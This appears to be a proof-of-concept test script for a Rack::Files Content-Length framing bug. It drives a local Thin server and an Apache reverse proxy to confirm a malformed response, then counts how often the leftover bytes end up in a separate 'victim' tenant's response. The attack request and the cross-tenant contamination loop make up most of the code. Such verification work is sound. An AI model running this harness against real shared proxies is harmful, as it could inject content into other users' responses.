#!/usr/bin/env python3
"""Test the Rack::Files framing bug through real Thin and Apache.

Rack 3.2.5 calculates Rack::Files error Content-Length with String#size.
The fixture uses a normal Rack streaming body to delay the already-mismatched
tail. This is intentionally reported as two separate facts: whether a real
server emits the malformed response, and whether Apache carries its delayed
tail into an independent victim response.
"""

from __future__ import annotations

import argparse
import os
import socket
import subprocess
import tempfile
import time
from pathlib import Path


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(8192)
        if not chunk:
            break
        data += chunk
    return data


def parse_response(sock: socket.socket) -> tuple[bytes, bytes, int, bytes]:
    data = recv_until(sock, b"\r\n\r\n")
    if b"\r\n\r\n" not in data:
        raise AssertionError(f"response headers incomplete: {data!r}")
    headers, body = data.split(b"\r\n\r\n", 1)
    length = None
    for line in headers.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            length = int(line.split(b":", 1)[1].strip())
            break
    if length is None:
        raise AssertionError(f"response has no Content-Length: {headers!r}")
    while len(body) < length:
        body += sock.recv(8192)
    return headers, body[:length], length, body[length:]


def wait_for_port(port: int, proc: subprocess.Popen[str], label: str, log_path: Path) -> None:
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            raise RuntimeError(f"{label} exited; log={log_path.read_text()!r}")
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                return
        except OSError:
            time.sleep(0.1)
    raise TimeoutError(f"{label} did not listen on {port}")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--httpd", required=True, type=Path)
    parser.add_argument("--server-root", required=True, type=Path)
    parser.add_argument("--thin", required=True, type=Path)
    parser.add_argument("--fixture", required=True, type=Path)
    parser.add_argument("--iterations", type=int, default=100)
    args = parser.parse_args()

    with tempfile.TemporaryDirectory(prefix="rack-thin-trigger-") as tmp:
        root = Path(tmp)
        rack_root = root / "files"
        rack_root.mkdir()
        thin_log = root / "thin.log"
        thin = subprocess.Popen(
            [str(args.thin), "start", "-R", str(args.fixture / "config.ru"),
             "-a", "127.0.0.1", "-p", "18181"],
            cwd=args.fixture,
            stdout=thin_log.open("w"),
            stderr=subprocess.STDOUT,
            text=True,
            env={**os.environ, "RACK_FILES_ROOT": str(rack_root)},
        )
        proxy = None
        try:
            wait_for_port(18181, thin, "Thin", thin_log)

            path = "/missing/" + "%E2%98%83" * 80
            direct_request = (
                f"GET {path} HTTP/1.1\r\nHost: tenant-a.example\r\n"
                "Connection: keep-alive\r\n\r\n"
            ).encode()
            with socket.create_connection(("127.0.0.1", 18181), timeout=5) as sock:
                sock.sendall(direct_request)
                _, body, declared, extra = parse_response(sock)
                sock.settimeout(2)
                try:
                    while True:
                        chunk = sock.recv(8192)
                        if not chunk:
                            break
                        extra += chunk
                except socket.timeout:
                    pass
            print(f"rack_thin_direct_declared={declared}")
            print(f"rack_thin_direct_actual={len(body) + len(extra)}")
            print(f"rack_thin_direct_mismatch={len(body) + len(extra) > declared}")
            if len(body) + len(extra) <= declared:
                raise AssertionError("Thin did not emit the expected real mismatch")

            config = root / "httpd.conf"
            config.write_text(f"""\
ServerRoot \"{args.server_root}\"
Listen 127.0.0.1:18080
PidFile \"{root / 'httpd.pid'}\"
ErrorLog \"{root / 'error.log'}\"
LogLevel proxy_http:trace2
LoadModule unixd_module modules/mod_unixd.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
ProxyPass / http://127.0.0.1:18181/ retry=0
ProxyPassReverse / http://127.0.0.1:18181/
""")
            proxy = subprocess.Popen(
                [str(args.httpd), "-f", str(config), "-DFOREGROUND", "-X"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "APACHE_RUN_DIR": str(root)},
            )
            wait_for_port(18080, proxy, "Apache", root / "error.log")

            contaminated = 0
            apache_errors = 0
            for i in range(args.iterations):
                attack = socket.create_connection(("127.0.0.1", 18080), timeout=5)
                with attack:
                    attack.sendall(
                        f"GET {path} HTTP/1.1\r\nHost: tenant-a.example\r\n"
                        "Connection: keep-alive\r\n\r\n".encode()
                    )
                    try:
                        parse_response(attack)
                    except (AssertionError, OSError, socket.timeout):
                        apache_errors += 1

                victim = socket.create_connection(("127.0.0.1", 18080), timeout=5)
                with victim:
                    victim.sendall(
                        b"GET /victim HTTP/1.1\r\nHost: tenant-b.example\r\n"
                        b"Connection: close\r\n\r\n"
                    )
                    try:
                        headers_b, body_b, _, _ = parse_response(victim)
                    except (AssertionError, OSError, socket.timeout):
                        apache_errors += 1
                        continue
                    if body_b != b"VICTIM-OWN":
                        contaminated += 1
                        print(f"rack_thin_contamination_iteration={i}")
                        print(f"rack_thin_victim_headers={headers_b!r}")
                        print(f"rack_thin_victim_body={body_b!r}")

            print(f"rack_thin_apache_cross_tenant_hits={contaminated}/{args.iterations}")
            print(f"rack_thin_apache_errors={apache_errors}/{args.iterations}")
            print("rack_thin_apache_boundary=observed" if contaminated else "rack_thin_apache_boundary=not_observed")
            return 0
        finally:
            if proxy is not None:
                proxy.terminate()
                try:
                    proxy.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proxy.kill()
            thin.terminate()
            try:
                thin.wait(timeout=3)
            except subprocess.TimeoutExpired:
                thin.kill()


if __name__ == "__main__":
    raise SystemExit(main())
